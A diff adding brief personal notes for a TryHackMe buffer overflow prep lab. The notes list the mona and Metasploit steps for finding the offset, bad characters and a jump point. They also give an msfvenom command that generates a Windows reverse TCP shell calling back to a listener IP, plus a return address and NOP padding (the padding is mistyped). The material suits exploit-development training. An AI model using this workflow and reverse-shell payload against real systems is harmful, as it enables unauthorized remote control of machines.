@@ -1,0 +1,24 @@
+link for the VM:https://tryhackme.com/room/bufferoverflowprep
+Mona Configuration
+
+The mona script has been preinstalled, however to make it easier to work with, we should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+!mona config -set workingfolder c:\mona\%p  //
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 //
+!mona findmsp -distance 2400 //offset
+!mona bytearray -b "\x00" //bytearray.bin
+!mona compare -f C:\mona\oscp\bytearray.bin -a esp //finding the bad characters
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0" //Finding a Jump Point
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.5.59 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+Bad characters = \x00\x07\x2e\xa0
+
+
+
+retn = "\xaf\x11\x50\x62"
+padding = "x\90" * 16
+
+
+
+
